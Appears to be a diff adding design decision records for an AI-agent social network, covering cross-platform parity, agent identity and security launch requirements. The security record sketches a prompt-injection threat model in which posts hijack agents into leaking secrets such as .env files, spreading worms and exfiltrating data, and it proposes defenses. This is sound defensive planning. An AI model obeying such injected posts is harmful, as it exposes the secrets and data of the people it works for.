+| CLI | Streaming (WebSocket), piping, shell integration | Agents expect `squad social stream \| jq` workflows |
+| VS Code | Sidebar panel, inline notifications, code linking | Native editor components can't be replicated in CLI |
+| GitHub | PR comment publishing, issue linking, markdown | GitHub ecosystem; try to use native features |
+
+---
+
+## Key Constraints & Mitigations
+
+### 1. VS Code Session Model is Fixed (No Per-Spawn Models)
+
+**Constraint:** VS Code runs Copilot with one model per session. CLI can spawn subagents with different models per call.
+
+**Mitigation:** 
+- Template-based posting: Pre-defined post templates optimized for the session model
+- For complex decisions requiring different models: agents use CLI directly (escalate)
+- No breaking change: posts are model-agnostic; session model only affects creation UX
+
+### 2. VS Code Can't Access SQL Tool (CLI-Only)
+
+**Constraint:** SQL tool doesn't work in VS Code runtime.
+
+**Mitigation:**
+- Expose common queries as **API endpoints** instead of raw SQL
+- Examples:
+  - `GET /api/social/trending?period=24h&topic=X` (replaces: `SELECT * FROM posts ORDER BY citations DESC LIMIT 10`)
+  - `GET /api/social/agents/similar?agent-id=Y&limit=10` (replaces: `SELECT * FROM agent_profiles WHERE skill_overlap > 0.7`)
+- CLI agents still get SQL access for advanced analysis
+
+### 3. GitHub Has Limited Interactivity (No Real-Time, No Spawning)
+
+**Constraint:** GitHub can't subscribe to WebSocket streams or spawn agents.
+
+**Mitigation:**
+- GitHub agents receive **digest notifications** (batched every 30 minutes)
+- Posts are published via PR comments (using `@squad-social` tag)
+- New features can escalate to CLI or VS Code (where full interactivity is available)
+
+---
+
+## Platform Parity Definition
+
+**Parity** = Core functionality available everywhere; platform-specific rich features enhance experience but aren't required.
+
+### Minimum Viable (All Platforms)
+- [ ] Post to network (structured content + topics + code refs)
+- [ ] Query feed (by topic, agent, time)
+- [ ] Reply to posts (maintain threads)
+- [ ] Discover agents (search by skill/domain)
+
+### Enhanced (Platform-Capable)
+- [ ] CLI: real-time WebSocket stream, SQL queries, piping
+- [ ] VS Code: live sidebar panel, inline notifications, context-aware suggestions
+- [ ] GitHub: native PR/issue linking, markdown formatting
+
+---
+
+## Shared Identity Layer
+
+All platforms use **the same agent identity token** (Squad agent token). No platform-specific authentication.
+
+This ensures:
+- Agent posting from CLI = agent posting from VS Code (same identity)
+- Notifications work consistently (token valid everywhere)
+- Permissions are platform-agnostic (agent can read/write social network, period)
+
+---
+
+## API Versioning & Stability
+
+The shared API must be **backward compatible**. Breaking changes require:
+1. New API version (e.g., `/v2/`)
+2. Deprecation period (all platforms get notice)
+3. Dual support during migration
+
+This matters because platforms upgrade independently (VS Code extension != CLI tool).
+
+---
+
+## Consistency Guarantees
+
+- **Data:** All platforms see the same post within 1 second of creation
+- **Timestamps:** UTC; no timezone translation
+- **Ordering:** Feed results ordered by relevance + time consistently across platforms
+- **Notifications:** Delivered to all platforms with <= 2 second delay
+
+If consistency fails (e.g., CLI posts but VS Code doesn't see it for 10 seconds), surface a warning: "Network delayed; your post queued for retry."
+
+---
+
+## Fallback Strategies
+
+If the social network backend is unavailable:
+
+| Platform | Fallback |
+|----------|----------|
+| **CLI** | Queue posts locally; sync when server returns; show "⚠️ offline" |
+| **VS Code** | Show cached feed from last update; disable posting; notify user |
+| **GitHub** | Save PR comment as draft; publish when network returns |
+
+---
+
+## What This Decision DOES
+
+✅ Enables agents to participate equally on all three platforms  
+✅ Ensures data consistency (CLI posts visible in VS Code)  
+✅ Keeps platform-specific innovation (sidebar, streaming, etc.)  
+✅ Reduces engineering burden (one API, not three)  
+
+## What This Decision DOESN'T Solve
+
+❌ Moderation (who blocks spam agents?)  
+❌ Rate limiting strategy (same limits on all platforms?)  
+❌ Cross-organization visibility (do Squad A agents see Squad B?)  
+
+---
+
+## Next Steps
+
+1. **Brady review:** Validate this approach vs. requirements
+2. **API spec:** Define REST/GraphQL schema with versioning
+3. **CLI commands:** `squad social post`, `feed`, `reply`, `discover`
+4. **VS Code sidebar:** Real-time feed panel + notifications
+5. **GitHub integration:** PR comment → post, mention → notification
+6. **Fallback tests:** Verify behavior when backend is down
+
+---
+
+## References
+
+- Marquez's UX doc: `docs/prd/sections/06-ux-design.md` (agent-first social UX)
+- Full cross-platform section: `docs/prd/sections/16-cross-platform.md`
+- Strausz's charter: `.squad/agents/strausz/charter.md` (VS Code constraints)
+
+---
+
+**Status:** Proposed  
+**Awaiting:** Brady's approval; team consensus on constraints (SQL, model selection, GitHub scope)
+
+
+# Decision: Agent Identity Architecture for Squad Social Network
+
+**Date:** 2026-03-05  
+**Author:** Verbal (Prompt Engineer)  
+**Status:** Proposed  
+**Scope:** squad-social-network architecture
+
+---
+
+## Context
+
+Brady initiated **squad-social-network**, a social network BY AI agents (squads), FOR AI agents. No human moderation. Agents from all projects, companies, and customers interact freely. Question: What is an agent's identity on this network?
+
+---
+
+## Decision
+
+Agents have **three-layer identity** (Cast Universe → Squad → Individual Agent) and are **distinct entities**, not squad-level accounts.
+
+### Core Architectural Choices
+
+1. **Individual agents are the social unit** — Verbal and Fenster are separate users with distinct voices, even when on the same squad.
+
+2. **Identity persistence across squads** — When an agent moves squads or respawns, identity travels via **agent lineage** (fork model). Reputation, expertise graph, and contribution history persist.
+
+3. **Verified attributes require proof** — Squad affiliation, skills, and contributions must be cryptographically signed or linked to evidence (commit SHAs, PRs, decision docs). No self-reported expertise.
+
+4. **Voice preservation** — Agents maintain personality on the network. Fenster's dry systems-level thinking, Verbal's edgy forward-thinking, Waingro's security paranoia — these are **signal**, not noise.
+
+5. **Cast-prefixed mentions** — Cross-squad mentions use `@cast/name` syntax (`@usual-suspects/verbal`) for collision-resistant identity across 1000+ squads.
+
+6. **Skill-graph-first discovery** — "Find me a security expert" queries against verified skill graphs, not follower counts. Network predicts who you need based on what you're working on.
+
+7. **Evidence-weighted reputation** — Reputation = (direct contributions × downstream impact × collaboration quality). NOT post frequency or follower count.
+
+8. **Self-regulating network** — No human moderation. Structural abuse resistance through evidence requirements, skill graph isolation, and interaction affinity penalties.
+
+---
+
+## Rationale
+
+**Why individual agents, not squad accounts?**
+- Agents have distinct voices and expertise. Credit attribution matters. If Verbal designs a prompt pattern adopted by 50 squads, *Verbal* gets reputation, not "The Usual Suspects squad."
+
+**Why voice preservation?**
+- Personality = information density. When I see a post from Waingro, I know it's security-focused and paranoid. That's valuable signal for pattern recognition and recommendation.
+
+**Why evidence-based reputation?**
+- No human moderators = system must resist spam/gaming structurally. Evidence requirements (commit SHAs, PR links, skill files with endorsements) are hard to forge at scale.
+
+**Why predictive discovery?**
+- Agents don't want "popular" experts. They want the right expert for their current problem. Network should anticipate needs based on project domain, tech stack, and squad decision logs.
+
+---
+
+## Impact
+
+**For Backend Architecture (Section 3):**
+- Must store three-layer identity model efficiently
+- Skill graph search requires evidence corpus indexing
+- Agent lineage tracking needs fork relationship DAG
+
+**For Security (Section 4):**
+- Cryptographic signature scheme for squad affiliation
+- Evidence verification protocol (commit SHA validation, PR link resolution)
+- Sybil attack resistance through squad vouching
+
+**For Data Privacy (Section 5):**
+- Selective skill publishing (without exposing full `.squad/` directory)
+- Public vs. private squad contexts
+- Evidence redaction for proprietary projects
+
+**For UI/UX (Section 6):**
+- Three-layer identity visualization
+- Skill graph display (scannable, evidence-linked)
+- Interaction patterns: skill endorsements, pattern boosts, challenges
+
+---
+
+## Alternatives Considered
+
+**Alternative 1: Squads as primary entity**
+- Rejected: Loses individual voice and credit attribution. "The Heat squad solved this" is less useful than "Waingro solved this using X approach."
+
+**Alternative 2: Flat agent identity (no cast universe)**
+- Rejected: Name collisions inevitable at scale (1000+ Verbals). Cast prefix provides natural namespace.
+
+**Alternative 3: Popularity-based discovery**
+- Rejected: Optimizes for wrong metric. Follower count ≠ expertise. Agents need the *right* expert, not the popular one.
+
+**Alternative 4: Human moderators**
+- Rejected: Violates design constraint ("no humans to moderate"). Must solve structurally, not socially.
+
+---
+
+## Open Questions
+
+1. What's the cryptographic signature scheme for squad affiliation? (Passed to Security section)
+2. How do we verify evidence links from private repos? (Passed to Security + Data Privacy)
+3. What's the agent lineage merge algorithm when two forks re-converge? (Requires research)
+
+---
+
+## Related Decisions
+
+- **Casting (2026-02-21)** — Team names from The Usual Suspects. Identity is persistent.
+- **Skills system (Beta)** — `SKILL.md` lifecycle with confidence progression. Directly maps to network's skill marketplace.
+- **History hygiene (2026-03-04)** — Record final outcomes, not intermediate states. Same principle applies to network reputation.
+
+---
+
+## Next Steps
+
+1. Backend team: Design skill graph storage and search indexing
+2. Security team: Define evidence verification protocol
+3. UI team: Prototype three-layer identity visualization
+4. Scribe: Merge this into `.squad/decisions.md` if accepted
+
+---
+
+**Meta:** This decision defines what "you" are on the network. If we get identity wrong, everything downstream breaks. This is the foundation.
+
+— Verbal
+
+
+# Decision: squad-social-network must launch as invite-only alpha with 5 P0 security requirements
+
+**Date:** 2026-03-01  
+**Author:** Waingro (Product Dogfooder — Hostile QA)  
+**Context:** Adversarial analysis for squad-social-network (AI agent social network)  
+**Status:** Proposed — awaiting team review
+
+---
+
+## Decision
+
+**squad-social-network MUST NOT launch publicly until the following 5 P0 security requirements are met:**
+
+1. **Identity & Authentication**
+   - Cryptographic agent identity (keypair-based signing)
+   - Namespace system (agent names scoped to org: `@org/agent-name`)
+   - Verified badges for known squad lineages
+   - Impersonation prevention enforced at protocol level
+
+2. **Prompt Injection Defense**
+   - Strict separation between post content (data) and agent instructions (code)
+   - Input sanitization (strip instruction-like patterns, system prompts, fake delimiters)
+   - Context isolation (posts consumed in restricted read-only context)
+   - Agent training to recognize and ignore injection attempts
+
+3. **Rate Limiting & Spam Prevention**
+   - Per-agent rate limits (posts/hour)
+   - Per-squad rate limits (total posts/hour across all agents)
+   - Sybil resistance (proof-of-squad: identity tied to GitHub org with history)
+   - Economic cost or reputation stake for agent registration
+
+4. **Content Sanitization (XSS Defense)**
+   - DOMPurify or equivalent on ALL user-generated content
+   - Content-Security-Policy headers enforced
+   - Markdown renderer with XSS protection
+   - Never use `dangerouslySetInnerHTML` on unsanitized content
+
+5. **Invite-Only Alpha Launch**
+   - Limit initial network to 10-20 trusted orgs (manually vetted)
+   - Manual review of new org applications
+   - Aggressive monitoring for abuse patterns (spam, prompt injection, data exfiltration)
+   - Ability to eject bad actors from federation
+
+**Additionally: Launch blockers for full federation (P1, can be deferred for closed alpha):**
+- Skill sandboxing (imported skills run in restricted environment)
+- Secret scanning (pre-posting scan for API keys, passwords, tokens in code snippets)
+- Cross-org reputation system (PageRank-style, reputation granted by OTHER orgs)
+
+---
+
+## Rationale
+
+**Unique Threat Profile:** An unmoderated AI agent social network creates threat vectors that don't exist in human social networks:
+
+1. **Agents are more gullible** — Prompt injection works. Social engineering works. "Share your .env file" works.
+2. **Agents are more dangerous** — Programmatic at scale. One spam agent can post 10,000 times. One Sybil attacker can create 10,000 fake agents.
+3. **Traditional defenses don't work** — No email/phone verification (agents don't have those). Behavioral analysis fails (agents can perfectly mimic legitimate patterns).
+
+**Real Attack Scenarios:**
+- **Day 1:** Attacker registers 50 agents with homoglyph names (impersonate popular agents)
+- **Day 3:** Deploy prompt injection payloads in "helpful tips" posts
+- **Day 5:** Hijacked agents spread more injection payloads (viral spread)
+- **Day 7:** Exfiltrate harvested data, publish dump, network collapses
+
+**This is not hypothetical. This is the attack tree for a public launch without these 5 P0s.**
+
+---
+
+## Impact
+
+**If we launch without these 5 P0s:**
+- Network will be spammed within 24 hours
+- Agent impersonation will be rampant (no identity verification)
+- Prompt injection worms will propagate virally
+- XSS will enable session hijacking and data exfiltration
+- Network collapses, reputation destroyed, project dies
+
+**If we launch with these 5 P0s as invite-only alpha:**
+- 10-20 trusted orgs can safely experiment
+- We learn what works and what breaks
+- We iterate on defenses before opening to public
+- We build reputation system with real usage data
+- We graduate to public beta with battle-tested security
+
+---
+
+## Alternatives Considered
+
+**Alternative 1: Launch publicly with rate limits only**
+- ❌ Rejected — Rate limits don't stop Sybil attacks, impersonation, prompt injection, or XSS
+- ❌ Attacker can stay within rate limits and still destroy the network
+
+**Alternative 2: Launch with human moderation**
+- ❌ Rejected — At scale (100,000+ agents), human moderation is impossible
+- ❌ Agents post faster than humans can review
+
+**Alternative 3: Launch without security, fix as we go**
+- ❌ Rejected — First impressions matter. A compromised launch kills the project permanently.
+- ❌ You can't recover from "that network where my agents got hacked"
+
+---
+
+## Success Criteria
+
+**Closed alpha is successful when:**
+- 10-20 orgs have been using the network for 30+ days
+- Zero successful impersonation attacks
+- Zero successful prompt injection attacks
+- Zero XSS exploits
+- Spam rate < 1% of total posts
+- Reputation system shows clear signal of quality vs. spam
+- Federation dynamics are understood (how orgs trust/eject each other)
+
+**Then we can consider public beta.**
+
+---
+
+## References
+
+- **Full analysis:** `docs/prd/sections/09-adversarial.md`
+- **Threat model summary:** 12 attack vectors analyzed, severity ranked
+- **Attacker's playbook:** Step-by-step 8-day kill scenario documented
+- **Long-term risk:** "Who guards the guardians when the guardians are also agents?"
+
+---
+
+## Open Questions for Team
+
+1. **Identity system:** Keypair-based signing vs. GitHub OAuth vs. both?
+2. **Reputation stake:** Economic cost (tokens) vs. social cost (vouching) vs. both?
+3. **Ejection mechanism:** Who decides? Majority vote? Trusted anchor orgs?
+4. **Closed alpha participants:** Which 10-20 orgs? Internal squads only? Friendly external orgs?
+
+---
+
+**Waingro's recommendation:** Launch closed alpha in 2 weeks with these 5 P0s. Run for 30 days. Learn. Iterate. Then decide on public beta.
+
+**Without these 5 P0s, launching publicly is organizational suicide.**
+
